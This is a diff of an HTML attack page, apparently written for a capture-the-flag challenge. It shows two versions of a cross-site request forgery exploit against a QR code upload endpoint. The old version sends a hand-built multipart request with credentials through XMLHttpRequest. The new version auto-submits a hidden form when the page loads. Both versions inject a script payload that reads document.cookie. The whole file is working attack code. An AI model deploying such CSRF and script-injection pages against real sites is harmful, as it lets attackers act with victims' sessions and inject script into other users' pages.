@@ -1,51 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
-    <title>JavaScript Injection Example</title>
+    <title>CSRF Attack on QR Code Upload</title>
     <script>
         window.onload = function() {
-            var xhr = new XMLHttpRequest();
-            var formData = new FormData();
+            // Create a form element
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://ctf.widyasecurity.com/upload'; // Target URL of the form submission
+            form.enctype = 'multipart/form-data'; // Set enctype for file upload
 
-            var body = "-----------------------------110423259726704186431623284180\r\n" + 
-                "Content-Disposition: form-data; name=\"qrcode\"\r\n" + 
-                "Content-Type: text/plain\r\n" + 
-                "\r\n" + 
-                "</script><script>alert(document.cookie)</script>\r\n" + 
-                "-----------------------------110423259726704186431623284180--\r\n";
+            // Create a file input field for qrcode
+            var input = document.createElement('input');
+            input.type = 'file';
+            input.name = 'qrcode';
 
-            var uint8Array = new Uint8Array(body.length);
-            for (var i = 0; i < uint8Array.length; i++) {
-                uint8Array[i] = body.charCodeAt(i);
-            }
+            // Create a hidden input field with the malicious payload
+            var scriptInput = document.createElement('input');
+            scriptInput.type = 'hidden';
+            scriptInput.name = 'csrf_payload';
+            scriptInput.value = '</script><script>alert(document.cookie)</script>';
 
-            var blob = new Blob([uint8Array], { type: 'text/plain' });
+            // Append the input fields to the form
+            form.appendChild(input);
+            form.appendChild(scriptInput);
 
-            formData.append('qrcode', blob);
-
-            xhr.open('POST', 'http://ctf.widyasecurity.com/upload', true);
-            xhr.setRequestHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8');
-            xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.5');
-            xhr.withCredentials = true;
-
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    console.log('Payload sent successfully');
-                    // Optionally redirect or perform other actions on success
-                } else {
-                    console.error('Payload failed to send. Status: ' + xhr.status);
-                }
-            };
-
-            xhr.onerror = function() {
-                console.error('Request failed');
-            };
-
-            xhr.send(formData);
+            // Append the form to the body and submit it
+            document.body.appendChild(form);
+            form.submit();
         };
     </script>
 </head>
+
 <body>
+    <h1>CSRF Attack on QR Code Upload</h1>
 </body>
+
 </html>
